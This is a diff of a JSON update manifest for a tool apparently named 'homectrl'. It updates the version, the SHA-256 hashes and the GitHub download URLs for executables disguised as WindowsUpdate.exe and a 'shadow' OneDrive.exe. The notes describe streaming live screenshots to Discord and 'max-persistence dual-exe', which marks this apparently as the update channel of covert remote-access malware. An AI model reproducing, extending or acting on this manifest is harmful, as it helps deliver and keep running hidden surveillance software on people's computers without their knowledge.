@@ -1,6 +1,8 @@
-{
-    "notes":  "/live command: Live-Screenshot-Stream in Discord (Message wird mit neuem Frame aktualisiert)",
-    "url":  "https://github.com/sayamuhbani59-collab/homectrl-updates/releases/download/v1.0.20/WindowsUpdate.exe",
-    "sha256":  "0164a3bbdca1ccd01f3bf16f9d31a88d1d1b75f868e9787db0c235661792debf",
-    "version":  "1.0.20"
+﻿{
+    "version":  "1.0.23",
+    "sha256":  "98d65d5010a26136da09b30da0fa119af0d18a6b1f9be56bfe59c7d2d9c0551f",
+    "url":  "https://github.com/sayamuhbani59-collab/homectrl-updates/releases/download/v1.0.23/WindowsUpdate.exe",
+    "shadowSha256":  "36662b77361caf77d25dd8c44524be1a5a379fa2c812bbeed6bac0ce0cccd4ff",
+    "shadowUrl":  "https://github.com/sayamuhbani59-collab/homectrl-updates/releases/download/v1.0.23/OneDrive.exe",
+    "notes":  "Max-persistence dual-exe + presence shows all users"
 }
